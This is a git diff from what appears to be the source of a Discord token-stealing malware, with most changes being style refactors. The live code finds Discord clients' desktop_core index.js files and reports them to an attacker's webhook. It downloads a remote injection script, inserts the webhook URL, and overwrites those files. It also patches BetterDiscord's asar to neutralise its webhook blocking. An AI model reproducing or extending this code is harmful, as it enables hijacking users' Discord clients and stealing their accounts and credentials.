@@ -25,7 +25,6 @@ const findIndexs = (f) => {
   try {
     fs.readdirSync(f).forEach((d) => {
       let p = path.join(f, d);
-
       if (fs.statSync(p).isDirectory()) {
         findIndexs(p);
       } else if (d === "index.js" && !f.includes("node_modules") && f.includes("desktop_core")) {
@@ -41,14 +40,12 @@ const injection = async (webhook) => {
   try {
     let m = "";
     let r = [];
-
     injecPath.forEach((k) => {
-      const p = k.match(/\\(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\\/i);
-      const n = p ? p[1] : "Not Found";
+      let p = k.match(/\\(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\\/i),
+        n = p ? p[1] : "Not Found";
       m += `\`${n}\`, `;
       r.push({ k, n });
     });
-
     await instance({
       url: webhook[0],
       method: "POST",
@@ -65,10 +62,7 @@ const injection = async (webhook) => {
         }]
       }
     });
-
-    let script = await instance.get(Injection);
-    let text = script.data.replace("%WEBHOOK%", webhook[0]).replace("%ID_REQUEST%", uniqueId());
-
+    let text = (await instance.get(Injection)).data.replace("%WEBHOOK%", webhook[0]).replace("%ID_REQUEST%", uniqueId());
     await Promise.all(injecPath.map(async (f) => {
       await fs.promises.writeFile(f, text, { encoding: "utf8", flag: "w" });
     }));
@@ -90,9 +84,7 @@ const bufferReplace = (buf, a, b) => {
 const betterBroke = async () => {
   try {
     let d = path.join(local, "BetterDiscord/data/betterdiscord.asar");
-    if (fs.existsSync(d)) {
-      await fs.promises.writeFile(d, bufferReplace(await fs.promises.readFile(d), "api/webhooks", "aurathemes"));
-    }
+    if (fs.existsSync(d)) await fs.promises.writeFile(d, bufferReplace(await fs.promises.readFile(d), "api/webhooks", "aurathemes"));
   } catch (e) {
     console.error(e);
   }
@@ -124,7 +116,6 @@ const findInjects = async (f) => {
     let d = await fs.promises.readdir(f);
     for (let x of d) {
       let p = path.join(f, x), ñ = await fs.promises.stat(p);
-
       if (ñ.isDirectory()) {
         if (x === "aura") {
           await fs.rmdirSync(p);
@@ -142,7 +133,6 @@ const discordInjected = async (a) => {
   try {
     if (a === false) return;
     let d = discordsDirs();
-    
     for (const p of d) {
       findIndexs(p);
     }
